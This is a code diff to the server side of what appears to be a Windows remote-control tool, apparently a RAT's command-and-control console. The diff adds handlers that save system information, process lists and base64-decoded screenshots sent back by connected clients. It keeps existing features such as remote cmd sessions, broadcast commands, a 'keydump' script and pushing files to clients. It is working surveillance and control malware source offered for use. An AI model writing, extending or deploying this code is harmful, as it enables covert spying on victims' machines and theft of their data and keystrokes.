@@ -1,7 +1,11 @@
 #include "Server.h"
+#include "iBase64.h"
+#include <Shlwapi.h>
 #include <process.h>
 
-Server* Server::serverptr; //Serverptr is necessary so the static ClientHandler method can access the server instance/functions.
+#pragma comment(lib, "shlwapi.lib")
+
+Server *Server::serverptr; //Serverptr is necessary so the static ClientHandler method can access the server instance/functions.
 
 Server::Server(int PORT, bool BroadcastPublically) //Port = port to broadcast on. BroadcastPublically = false if server is not open to the public (people outside of your router), true = server is open to everyone (assumes that the port is properly forwarded on router settings)
 {
@@ -16,13 +20,13 @@ Server::Server(int PORT, bool BroadcastPublically) //Port = port to broadcast on
 
 	if (BroadcastPublically) //If server is open to public
 		addr.sin_addr.s_addr = htonl(INADDR_ANY);
-	else //If server is only for our router
+	else											   //If server is only for our router
 		addr.sin_addr.s_addr = inet_addr("127.0.0.1"); //Broadcast locally
-	addr.sin_port = htons(PORT); //Port
-	addr.sin_family = AF_INET; //IPv4 Socket
+	addr.sin_port = htons(PORT);					   //Port
+	addr.sin_family = AF_INET;						   //IPv4 Socket
 
-	sListen = socket(AF_INET, SOCK_STREAM, NULL); //Create socket to listen for new connections
-	if (bind(sListen, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) //Bind the address to the socket, if we fail to bind the address..
+	sListen = socket(AF_INET, SOCK_STREAM, NULL);						//Create socket to listen for new connections
+	if (bind(sListen, (SOCKADDR *)&addr, sizeof(addr)) == SOCKET_ERROR) //Bind the address to the socket, if we fail to bind the address..
 	{
 		std::string ErrorMsg = "Failed to bind the address to our listening socket. Winsock Error:" + std::to_string(WSAGetLastError());
 		MessageBoxA(NULL, ErrorMsg.c_str(), "Error", MB_OK | MB_ICONERROR);
@@ -35,12 +39,12 @@ Server::Server(int PORT, bool BroadcastPublically) //Port = port to broadcast on
 		exit(1);
 	}
 	serverptr = this;
-    _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)PacketSenderThread, NULL, NULL, NULL); //Create thread that will manage all outgoing packets
+	_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)PacketSenderThread, NULL, NULL, NULL); //Create thread that will manage all outgoing packets
 }
 
 void Server::ListenForNewConnection()
 {
-    _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)ListenerThread, NULL, NULL, NULL); //Create thread that will manage all outgoing packets
+	_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)ListenerThread, NULL, NULL, NULL); //Create thread that will manage all outgoing packets
 }
 
 void Server::HandleInput()
@@ -52,7 +56,7 @@ void Server::HandleInput()
 	{
 		std::getline(std::cin, userinput);
 
-		if (currentSessionID == -1)			//handle command while not having selected a client
+		if (currentSessionID == -1) //handle command while not having selected a client
 		{
 			if (General::processParameter(userinput, "connect"))
 			{
@@ -68,12 +72,12 @@ void Server::HandleInput()
 				inputInt = 0;
 				userinput.empty();
 			}
-			else if (General::processParameter(userinput, "broadcast"))		//broadcasts commands to all clients
+			else if (General::processParameter(userinput, "broadcast")) //broadcasts commands to all clients
 			{
 				General::outputMsg("Entering broadcast mode. To disable, type 'exitSession'", 1);
 				currentSessionID = -2;
 			}
-			else if (General::processParameter(userinput, "listClients"))	//counts clients (TODO: list clients)
+			else if (General::processParameter(userinput, "listClients")) //counts clients (TODO: list clients)
 			{
 				if (connections.size() <= 0)
 				{
@@ -88,8 +92,7 @@ void Server::HandleInput()
 				General::outputMsg("Please connect to a session with 'connect'", 2);
 		}
 
-
-		else						//handle command when client is selected
+		else //handle command when client is selected
 		{
 			if (userinput == "exitSession")
 			{
@@ -133,11 +136,11 @@ void Server::HandleInput()
 	}
 }
 
-void Server::handleScript(std::string script)		//temporary, will implement client-side version
+void Server::handleScript(std::string script) //temporary, will implement client-side version
 {
 	General::outputMsg("Executing script", 1);
 
-	SendString(currentSessionID, (std::string)"remoteControl cmd", PacketType::Instruction);
+	SendString(currentSessionID, (std::string) "remoteControl cmd", PacketType::Instruction);
 	Sleep(2000);
 	if (General::processParameter(script, "keydump"))
 	{
@@ -149,7 +152,7 @@ void Server::handleScript(std::string script)		//temporary, will implement clien
 		General::outputMsg("Script not recognized", 2);
 	}
 
-	SendString(currentSessionID, (std::string)"remoteControl", PacketType::Instruction);
+	SendString(currentSessionID, (std::string) "remoteControl", PacketType::Instruction);
 }
 
 bool Server::ProcessPacket(int ID, PacketType _packettype)
@@ -159,20 +162,20 @@ bool Server::ProcessPacket(int ID, PacketType _packettype)
 
 	case PacketType::Instruction: //Packet Type: chat message
 	{
-		std::string message; //string to store our message we received
+		std::string message;		 //string to store our message we received
 		if (!GetString(ID, message)) //Get the chat message and store it in variable: Message
-			return false; //If we do not properly get the chat message, return false
-						  //Next we need to send the message out to each user
+			return false;			 //If we do not properly get the chat message, return false
+									 //Next we need to send the message out to each user
 		General::outputMsg("ID [" + std::to_string(ID) + "]: " + message, 1);
 		break;
 	}
 
 	case PacketType::CMDCommand:
 	{
-		std::string message; //string to store our message we received
+		std::string message;		 //string to store our message we received
 		if (!GetString(ID, message)) //Get the chat message and store it in variable: Message
-			return false; //If we do not properly get the chat message, return false
-						  //Next we need to send the message out to each user
+			return false;			 //If we do not properly get the chat message, return false
+									 //Next we need to send the message out to each user
 
 		General::outputMsg(message, 3);
 
@@ -181,31 +184,158 @@ bool Server::ProcessPacket(int ID, PacketType _packettype)
 
 	case PacketType::Warning:
 	{
-		std::string message; //string to store our message we received
+		std::string message;		 //string to store our message we received
 		if (!GetString(ID, message)) //Get the chat message and store it in variable: Message
-			return false; //If we do not properly get the chat message, return false
-						  //Next we need to send the message out to each user
+			return false;			 //If we do not properly get the chat message, return false
+									 //Next we need to send the message out to each user
 		General::outputMsg("ID [" + std::to_string(ID) + "]: " + message, 2);
+		break;
+	}
+
+	case PacketType::SystemInfo:
+	{
+		HANDLE hSystemInfo = INVALID_HANDLE_VALUE;
+		DWORD dwRetLength;
+		;
+		std::string message;
+		SYSTEMTIME SystemTime;
+		CHAR szFileName[256] = {0x00};
+
+		if (!PathFileExistsA(std::to_string(ID).c_str()))
+		{
+			if (!CreateDirectoryA(std::to_string(ID).c_str(), NULL))
+			{
+				break;
+			}
+		}
+
+		GetLocalTime(&SystemTime);
+		memset(szFileName, 0x00, sizeof(szFileName));
+		sprintf_s(szFileName, ".//%s//SystemInfo_%d_%d_%d_%d_%d_%d", std::to_string(ID).c_str(), SystemTime.wYear, SystemTime.wMonth, SystemTime.wDay, SystemTime.wHour, SystemTime.wMinute, SystemTime.wSecond);
+
+		if (!GetString(ID, message))
+		{
+			break;
+		}
+
+		//General::outputMsg("ID [" + std::to_string(ID) + "]: " + message, 1);
+
+		hSystemInfo = CreateFileA(szFileName, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+		if (hSystemInfo == INVALID_HANDLE_VALUE)
+		{
+			General::outputMsg("ID [" + std::to_string(ID) + "]: " + "CreateFile fail, error: " + std::to_string(GetLastError()), 2);
+			break;
+		}
+
+		WriteFile(hSystemInfo, message.c_str(), message.length(), &dwRetLength, NULL);
+		CloseHandle(hSystemInfo);
+		break;
+	}
+
+	case PacketType::ProcessInfo:
+	{
+		HANDLE hSystemInfo = INVALID_HANDLE_VALUE;
+		DWORD dwRetLength;
+		;
+		std::string message;
+		SYSTEMTIME SystemTime;
+		CHAR szFileName[256] = {0x00};
+
+		if (!PathFileExistsA(std::to_string(ID).c_str()))
+		{
+			if (!CreateDirectoryA(std::to_string(ID).c_str(), NULL))
+			{
+				break;
+			}
+		}
+
+		GetLocalTime(&SystemTime);
+		memset(szFileName, 0x00, sizeof(szFileName));
+		sprintf_s(szFileName, ".//%s//ProcessInfo_%d_%d_%d_%d_%d_%d", std::to_string(ID).c_str(), SystemTime.wYear, SystemTime.wMonth, SystemTime.wDay, SystemTime.wHour, SystemTime.wMinute, SystemTime.wSecond);
+
+		if (!GetString(ID, message))
+		{
+			break;
+		}
+
+		//General::outputMsg("ID [" + std::to_string(ID) + "]: " + message, 1);
+
+		hSystemInfo = CreateFileA(szFileName, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+		if (hSystemInfo == INVALID_HANDLE_VALUE)
+		{
+			break;
+		}
+
+		WriteFile(hSystemInfo, message.c_str(), message.length(), &dwRetLength, NULL);
+		CloseHandle(hSystemInfo);
+		break;
+	}
+
+	case PacketType::ScreenShot:
+	{
+		HANDLE hSystemInfo = INVALID_HANDLE_VALUE;
+		DWORD dwRetLength;
+		;
+		std::string message;
+		SYSTEMTIME SystemTime;
+		CHAR szFileName[256] = {0x00};
+		CBASE64 Base64;
+		BYTE *pScreenshotDecodeBuf = NULL;
+		int iScreenshotDecodeBufSize;
+
+		if (!PathFileExistsA(std::to_string(ID).c_str()))
+		{
+			if (!CreateDirectoryA(std::to_string(ID).c_str(), NULL))
+			{
+				break;
+			}
+		}
+
+		GetLocalTime(&SystemTime);
+		memset(szFileName, 0x00, sizeof(szFileName));
+		sprintf_s(szFileName, ".//%s//Screenshot_%d_%d_%d_%d_%d_%d.bmp", std::to_string(ID).c_str(), SystemTime.wYear, SystemTime.wMonth, SystemTime.wDay, SystemTime.wHour, SystemTime.wMinute, SystemTime.wSecond);
+
+		if (!GetString(ID, message))
+		{
+			break;
+		}
+
+		hSystemInfo = CreateFileA(szFileName, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+		if (hSystemInfo == INVALID_HANDLE_VALUE)
+		{
+			break;
+		}
+
+		iScreenshotDecodeBufSize = message.length();
+		pScreenshotDecodeBuf = new BYTE[iScreenshotDecodeBufSize];
+		memset(pScreenshotDecodeBuf, 0x00, iScreenshotDecodeBufSize);
+		Base64.Base64Decode((unsigned char *)message.c_str(), message.length(), pScreenshotDecodeBuf, iScreenshotDecodeBufSize);
+
+		WriteFile(hSystemInfo, pScreenshotDecodeBuf, iScreenshotDecodeBufSize, &dwRetLength, NULL);
+		CloseHandle(hSystemInfo);
+		delete[] pScreenshotDecodeBuf;
+		pScreenshotDecodeBuf = NULL;
+
 		break;
 	}
 
 	case PacketType::FileTransferRequestFile:
 	{
-		std::string FileName; //string to store file name
+		std::string FileName;		  //string to store file name
 		if (!GetString(ID, FileName)) //If issue getting file name
-			return false; //Failure to process packet
+			return false;			  //Failure to process packet
 
 		connections[ID]->file.infileStream.open(FileName, std::ios::binary | std::ios::ate); //Open file to read in binary | ate mode. We use ate so we can use tellg to get file size. We use binary because we need to read bytes as raw data
-		if (!connections[ID]->file.infileStream.is_open()) //If file is not open? (Error opening file?)
+		if (!connections[ID]->file.infileStream.is_open())									 //If file is not open? (Error opening file?)
 		{
 			std::cout << "Client: " << ID << " requested file: " << FileName << ", but that file does not exist." << std::endl;
 			return true;
 		}
 
-		connections[ID]->file.fileName = FileName; //set file name just so we can print it out after done transferring
+		connections[ID]->file.fileName = FileName;									 //set file name just so we can print it out after done transferring
 		connections[ID]->file.fileSize = connections[ID]->file.infileStream.tellg(); //Get file size
-		connections[ID]->file.infileStream.seekg(0); //Set cursor position in file back to offset 0 for when we read file
-		connections[ID]->file.fileOffset = 0; //Update file offset for knowing when we hit end of file
+		connections[ID]->file.infileStream.seekg(0);								 //Set cursor position in file back to offset 0 for when we read file
+		connections[ID]->file.fileOffset = 0;										 //Update file offset for knowing when we hit end of file
 
 		if (!HandleSendFile(ID)) //Attempt to send byte buffer from file. If failure...
 			return false;
@@ -234,10 +364,10 @@ bool Server::HandleSendFile(int ID)
 		return false;
 
 	connections[ID]->file.remainingBytes = connections[ID]->file.fileSize - connections[ID]->file.fileOffset; //calculate remaining bytes
-	if (connections[ID]->file.remainingBytes > connections[ID]->file.buffersize) //if remaining bytes > max byte buffer
+	if (connections[ID]->file.remainingBytes > connections[ID]->file.buffersize)							  //if remaining bytes > max byte buffer
 	{
 		connections[ID]->file.infileStream.read(connections[ID]->file.buffer, connections[ID]->file.buffersize); //read in max buffer size bytes
-		if (!Sendint32_t(ID, connections[ID]->file.buffersize)) //send int of buffer size
+		if (!Sendint32_t(ID, connections[ID]->file.buffersize))													 //send int of buffer size
 			return false;
 		if (!sendall(ID, connections[ID]->file.buffer, connections[ID]->file.buffersize)) //send bytes for buffer
 			return false;
@@ -246,7 +376,7 @@ bool Server::HandleSendFile(int ID)
 	else
 	{
 		connections[ID]->file.infileStream.read(connections[ID]->file.buffer, connections[ID]->file.remainingBytes); //read in remaining bytes
-		if (!Sendint32_t(ID, connections[ID]->file.remainingBytes)) //send int of buffer size
+		if (!Sendint32_t(ID, connections[ID]->file.remainingBytes))													 //send int of buffer size
 			return false;
 		if (!sendall(ID, connections[ID]->file.buffer, connections[ID]->file.remainingBytes)) //send bytes for buffer
 			return false;
@@ -258,8 +388,10 @@ bool Server::HandleSendFile(int ID)
 		if (!SendPacketType(ID, PacketType::FileTransfer_EndOfFile)) //Send end of file packet
 			return false;
 		//Print out data on server details about file that was sent
-		std::cout << std::endl << "File sent: " << connections[ID]->file.fileName << std::endl;
-		std::cout << "File size(bytes): " << connections[ID]->file.fileSize << std::endl << std::endl;
+		std::cout << std::endl
+				  << "File sent: " << connections[ID]->file.fileName << std::endl;
+		std::cout << "File size(bytes): " << connections[ID]->file.fileSize << std::endl
+				  << std::endl;
 	}
 	return true;
 }
@@ -270,9 +402,9 @@ void Server::ClientHandlerThread(int ID) //ID = the index in the SOCKET connecti
 	while (true)
 	{
 		if (!serverptr->GetPacketType(ID, packettype)) //Get packet type
-			break; //If there is an issue getting the packet type, exit this loop
+			break;									   //If there is an issue getting the packet type, exit this loop
 		if (!serverptr->ProcessPacket(ID, packettype)) //Process packet (packet type)
-			break; //If there is an issue processing the packet, exit this loop
+			break;									   //If there is an issue processing the packet, exit this loop
 	}
 	std::cout << "Lost connection to client ID: " << ID << std::endl;
 	serverptr->DisconnectClient(ID); //Disconnect this client and clean up the connection if possible
@@ -288,7 +420,7 @@ void Server::PacketSenderThread() //Thread for all outgoing packets
 			if (serverptr->connections[i]->pm.HasPendingPackets()) //If there are pending packets for this connection's packet manager
 			{
 				Packet p = serverptr->connections[i]->pm.Retrieve(); //Retrieve packet from packet manager
-				if (!serverptr->sendall(i, p.buffer, p.size)) //send packet to connection
+				if (!serverptr->sendall(i, p.buffer, p.size))		 //send packet to connection
 				{
 					std::cout << "Failed to send packet to ID: " << i << std::endl; //Print out if failed to send packet
 				}
@@ -303,16 +435,16 @@ void Server::ListenerThread()
 {
 	while (true)
 	{
-		SOCKET newConnectionSocket = accept(serverptr->sListen, (SOCKADDR*)&serverptr->addr, &serverptr->addrlen); //Accept a new connection
-		if (newConnectionSocket == 0) //If accepting the client connection failed
+		SOCKET newConnectionSocket = accept(serverptr->sListen, (SOCKADDR *)&serverptr->addr, &serverptr->addrlen); //Accept a new connection
+		if (newConnectionSocket == 0)																				//If accepting the client connection failed
 		{
 			std::cout << "Failed to accept the client's connection." << std::endl;
 		}
 		else //If client connection properly accepted
 		{
 			std::lock_guard<std::mutex> lock(serverptr->connectionMgr_mutex); //Lock connection manager mutex since we are adding an element to connection vector
-			int NewConnectionID = serverptr->connections.size(); //default new connection id to size of connections vector (we will change it if we can reuse an unused connection)
-			if (serverptr->UnusedConnections > 0) //If there is an unused connection that this client can use
+			int NewConnectionID = serverptr->connections.size();			  //default new connection id to size of connections vector (we will change it if we can reuse an unused connection)
+			if (serverptr->UnusedConnections > 0)							  //If there is an unused connection that this client can use
 			{
 				for (size_t i = 0; i < serverptr->connections.size(); i++) //iterate through the unused connections starting at first connection
 				{
@@ -332,7 +464,7 @@ void Server::ListenerThread()
 				serverptr->connections.push_back(newConnection); //push new connection into vector of connections
 			}
 			std::cout << "Client Connected! ID:" << NewConnectionID << " | IP: " << inet_ntoa(serverptr->addr.sin_addr) << std::endl;
-            _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)ClientHandlerThread, (LPVOID)(NewConnectionID), NULL, NULL); //Create Thread to handle this client. The index in the socket array for this thread is the value (i).
+			_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)ClientHandlerThread, (LPVOID)(NewConnectionID), NULL, NULL); //Create Thread to handle this client. The index in the socket array for this thread is the value (i).
 		}
 	}
 }
@@ -341,14 +473,14 @@ void Server::DisconnectClient(int ID) //Disconnects a client and cleans up socke
 {
 	currentSessionID = -1;
 	std::lock_guard<std::mutex> lock(connectionMgr_mutex); //Lock connection manager mutex since we are possible removing element(s) from the vector
-	if (connections[ID]->ActiveConnection == false) //If connection has already been disconnected?
+	if (connections[ID]->ActiveConnection == false)		   //If connection has already been disconnected?
 	{
 		return; //return - this should never happen, but just in case...
 	}
-	connections[ID]->pm.Clear(); //Clear out all remaining packets in queue for this connection
+	connections[ID]->pm.Clear();			   //Clear out all remaining packets in queue for this connection
 	connections[ID]->ActiveConnection = false; //Update connection's activity status to false since connection is now unused
-	closesocket(connections[ID]->socket); //Close the socket for this connection
-	if (ID == (connections.size() - 1)) //If last connection in vector.... (we can remove it)
+	closesocket(connections[ID]->socket);	   //Close the socket for this connection
+	if (ID == (connections.size() - 1))		   //If last connection in vector.... (we can remove it)
 	{
 		connections.pop_back(); //Erase last connection from vector
 								//After cleaning up that connection, check if there are any more connections that can be erased (only connections at the end of the vector can be erased)
